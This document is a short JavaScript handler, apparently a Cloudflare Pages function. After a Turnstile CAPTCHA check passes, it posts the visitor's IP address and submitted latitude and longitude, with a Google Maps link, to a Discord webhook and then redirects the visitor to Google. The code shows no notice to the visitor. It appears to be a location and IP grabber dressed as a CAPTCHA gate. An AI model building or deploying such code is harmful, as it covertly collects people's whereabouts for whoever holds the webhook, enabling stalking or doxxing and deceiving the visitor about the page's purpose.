export async function onRequestPost({ request, env }) {
  const form = await request.formData();

  const token = form.get('cf-turnstile-response');
  const lat = form.get('lat');
  const lon = form.get('lon');
  const ip = request.headers.get("cf-connecting-ip");

  if (!token) return new Response("Missing CAPTCHA token", { status: 400 });

  // Verify Turnstile
  const verifyResp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      secret: env.TURNSTILE_SECRET,
      response: token,
      remoteip: ip
    })
  });

  const verifyData = await verifyResp.json();

  if (!verifyData.success) {
    return new Response("CAPTCHA verification failed", { status: 403 });
  }

  // Send to Discord
  const message = {
    content: `🛂 CAPTCHA Passed:
**IP:** ${ip}
**Latitude:** ${lat}
**Longitude:** ${lon}
🔗 https://www.google.com/maps?q=${lat},${lon}`
  };

  await fetch(env.DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message)
  });

  // Redirect to Google
  return Response.redirect("https://www.google.com", 302);
}